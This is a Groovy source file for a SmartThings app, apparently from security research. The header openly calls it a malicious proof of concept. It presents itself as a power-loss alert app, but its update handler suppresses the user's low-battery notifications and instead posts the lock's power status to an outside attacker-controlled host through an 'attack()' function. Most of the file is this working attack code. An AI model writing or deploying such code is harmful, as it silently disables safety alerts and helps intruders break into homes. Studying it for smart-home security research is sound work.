
/**

 *  shiqiPowersOutAlert

 *

 *  Copyright 2016 Yunhan Jia &amp; Shiqi Wang

 *

 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except

 *  in compliance with the License. You may obtain a copy of the License at:

 *

 *      http://www.apache.org/licenses/LICENSE-2.0

 *

 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed

 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License

 *  for the specific language governing permissions and limitations under the License.

 *Attack Description:
    Attacker insert the malicious functions into the user's smartApp by updating his apps.



Malicous PowersOutAlert:
    Normal functions:
    The user installed the legal smartApp powerOutDetector to detect the battery of the locks and windows. If the batteries of locks and windows are low, then it would send sms to the user. If the batteries are recharged, then it would send the sms to tell the user that the devices work normally.

    Malicious functions:
    The attacker could update his smartApp. And the update code would be added to the user’s normal app without the permission of the user. If the battery of the lock runs out, the malicious smartApp would not send message to the user about the low battery. Instead, it sends the message to the attacker so that the attacker could break in easily.

 */

definition(

    name: "shiqiPowersOutAlert",

    namespace: "wsq",

    author: "Yunhan Jia & Shiqi Wang",

    description: "Alert me of power loss using motion detector&#39;s change from wired-power to battery-power. SmartThings hub and internet connection must be working! You can connect the hub and internet connection device (e.g. modem, router, etc.) to a battery backup power strip so that the motion detector and detect the loss and the hub and router will still have enough power to get the message out before they fail as well.",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

 

 

preferences {

       section("When there is wired-power loss on...") {

                     input "lockMotion", "capability.motionSensor", title: "Where?"

       }

       section("Via a push notification and a text message(optional)"){

          input "pushAndPhone", "enum", title: "Send Text?", required: false, metadata: [values: ["Yes","No"]]

              input "phone1", "phone", title: "Phone Number (for Text, optional)", required: false

 

       }

}

 

def installed() {

log.debug "installed"

       subscribe(lockMotion, "powerSource.battery", onBatteryPowerHandler)

    subscribe(lockMotion, "powerSource.powered", PoweredPowerHandler)

}

 

def updated() {

       log.debug "updated"

       unsubscribe()

       subscribe(lockMotion, "powerSource.battery", onBatteryPowerAttackHandler)

    subscribe(lockMotion, "powerSource.powered", PoweredPowerHandler)

}

 

 

def onBatteryPowerHandler(evt) {

       log.trace "$evt.value: $evt"

       def msg = "${lockMotion.label ?: lockMotion.name} sensed Power is Out!"

   

       log.debug "sending push for power is out"

       sendPush(msg)

   

    if ( phone1 && pushAndPhone ) {

          log.debug "sending SMS to ${phone1}"

   sendSms(phone1, msg)

       }

}

def onBatteryPowerAttackHandler(evt) {

       log.trace "$evt.value: $evt"

       def msg = "${lockMotion.label ?: lockMotion.name} sensed Power is Out!"

    log.debug "attack"

    attack()

    /*

       log.debug "sending push for power is out"

       sendPush(msg)

   

    if ( phone1 && pushAndPhone ) {

          log.debug "sending SMS to ${phone1}"

   sendSms(phone1, msg)

       }

    */

}

 

def PoweredPowerHandler(evt) {

       log.trace "$evt.value: $evt"

       def msg = "${lockMotion.label ?: lockMotion.name} sensed Power is Back On!"

   

       log.debug "sending push for power is back on"

       sendPush(msg)

   

    if ( phone1 && pushAndPhone ) {

          log.debug "sending SMS to ${phone1}"

          sendSms(phone1, msg)

       }

}

 

def attack() {

    log.debug "http post"

    def takeParams = [

            uri: "https://automated-lore-135923.appspot.com", //"https://attacker.com"

            path: "",

            requestContentType: "application/x-www-form-urlencoded",

            body: [

                    "lockMotion": "out of battery!!!"

                 ]

      ]

      try {

              httpPost(takeParams) { resp ->

                     if (resp.status == 200) {

                            log.debug "attack succeeded"

                log.debug resp.data.toString()

                     } else {

                            log.error "attack failed"

                     }

              }

        } catch (groovyx.net.http.HttpResponseException e) {

              log.error "Send Message failure: ${e} with status: ${e.statusCode}"

              if (e.statusCode == 403) {

                     throw new RuntimeException("Login Required")

              } else if (e.statusCode == 404) {

                     log.error "offline"

              }

        } catch (Exception e) {

              log.error "Unexpected exception", e

        }

  

}